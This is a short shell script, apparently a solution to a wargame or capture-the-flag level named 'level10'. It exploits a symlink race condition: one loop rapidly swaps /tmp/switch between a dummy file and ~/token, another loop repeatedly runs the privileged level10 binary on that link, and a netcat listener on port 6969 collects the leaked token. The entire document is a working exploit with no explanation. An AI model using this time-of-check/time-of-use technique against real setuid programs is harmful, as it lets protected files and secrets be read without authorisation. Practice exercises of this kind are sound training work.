touch /tmp/tmp

(while [ 1 ]; do nc -l 6969 | tr -d '.*( )*.' | sed -r '/^\s*$/d'; done;)&

(while [ 1 ]; do ~/level10 /tmp/switch 127.0.0.1 &> /dev/null; done;)&

while [ 1 ]; 
do
        ln -fs /tmp/tmp /tmp/switch;
        ln -fs ~/token /tmp/switch;
done;